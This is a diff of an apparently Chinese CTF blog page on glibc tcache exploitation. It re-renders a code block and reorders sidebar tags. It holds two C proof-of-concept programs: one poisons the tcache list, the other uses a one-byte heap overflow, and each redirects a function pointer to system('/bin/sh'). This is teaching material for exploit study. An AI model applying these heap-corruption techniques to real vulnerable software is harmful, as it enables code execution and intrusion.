@@ -247,41 +247,8 @@
 <h2 id="tcache链表劫持"><a href="#tcache链表劫持" class="headerlink" title="tcache链表劫持"></a>tcache链表劫持</h2><p>可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。</p>
    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (* c[<span class="number">6</span>])(<span class="keyword">char</span> *) ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If there is a function ptr array here: %p\n"</span>,c);</span><br><span class="line">    c[<span class="number">3</span>] = <span class="built_in">puts</span>;</span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc a chunk here , %p. then free it\n "</span>,mem);</span><br><span class="line">    tcache_entry *victim = (tcache_entry *)mem;</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    victim-&gt;next = (<span class="keyword">void</span> *)c; </span><br><span class="line">    <span class="keyword">size_t</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc twice,get addr 1: %p,2: %p\n"</span>,mem1,mem2);</span><br><span class="line">    mem2[<span class="number">3</span>] = (<span class="keyword">size_t</span> )system;</span><br><span class="line">    (*c[<span class="number">3</span>])(<span class="string">"/bin/sh"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。</p>
-<pre><code> #include &lt;malloc.h&gt;
- #include &lt;stddef.h&gt;
- #include &lt;stdio.h&gt;
- #include &lt;stdlib.h&gt;
- #include &lt;stdint.h&gt;
-typedef struct tcache_entry
- {
-   struct tcache_entry *next;
- } tcache_entry;
-
- size_t *chunksizep(void *mem) {
-     return (size_t *)(((char *)mem) - sizeof(size_t));
- }
-
- int main(int argc, const char* argv[]) {
-     size_t  *a = malloc(0x48);
-     size_t  *b = malloc(0x48);
-     size_t  *c = malloc(0x48);    
-     printf(&quot;first , we malloc 3 chunks,1: %p,2: %p,3: %p\n&quot;,a,b,c);
-     void (* ptr)(char *) ;
-     *c = puts;
-     printf(&quot;overflow....\n&quot;);
-     memset(a, &apos;a&apos;, 0x48+1);
-     printf(&quot;free middle of the three\n &quot;);
-     free(b);
-     size_t * d = malloc(0x58);
-     printf(&quot;then malloc a bigger chunk:%p\n &quot;,d);
-     d[0x58/sizeof(size_t)-1] = system;
-     printf(&quot;%p,%p&quot;,c,&amp;d[0x58/sizeof(size_t)-1]);
-     ptr = *c;
-     (*ptr)(&quot;/bin/sh&quot;); 
-
-     return 0;
- }
-</code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">     <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">     <span class="keyword">size_t</span>  *a = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *b = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *c = <span class="built_in">malloc</span>(<span class="number">0x48</span>);    </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"first , we malloc 3 chunks,1: %p,2: %p,3: %p\n"</span>,a,b,c);</span><br><span class="line">     <span class="keyword">void</span> (* ptr)(<span class="keyword">char</span> *) ;</span><br><span class="line">     *c = <span class="built_in">puts</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"overflow....\n"</span>);</span><br><span class="line">     <span class="built_in">memset</span>(a, <span class="string">'a'</span>, <span class="number">0x48</span>+<span class="number">1</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"free middle of the three\n "</span>);</span><br><span class="line">     <span class="built_in">free</span>(b);</span><br><span class="line">     <span class="keyword">size_t</span> * d = <span class="built_in">malloc</span>(<span class="number">0x58</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"then malloc a bigger chunk:%p\n "</span>,d);</span><br><span class="line">     d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>] = system;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%p,%p"</span>,c,&amp;d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>]);</span><br><span class="line">     ptr = *c;</span><br><span class="line">     (*ptr)(<span class="string">"/bin/sh"</span>); </span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p>
 <p><a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p>
 <p>34C3 CTF —— SimpleGC</p>
 
@@ -491,17 +458,17 @@ typedef struct tcache_entry
         <div class="sidebar-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name"><a href= "#">hello</a></span>
-    
-        <span class="sidebar-tag-name"><a href= "#">world</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">CTF</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">PWN</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">Questions</a></span>
+        <span class="sidebar-tag-name"><a href= "#">hello</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">world</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">Linux</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Questions</a></span>
     
     </div>
     <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
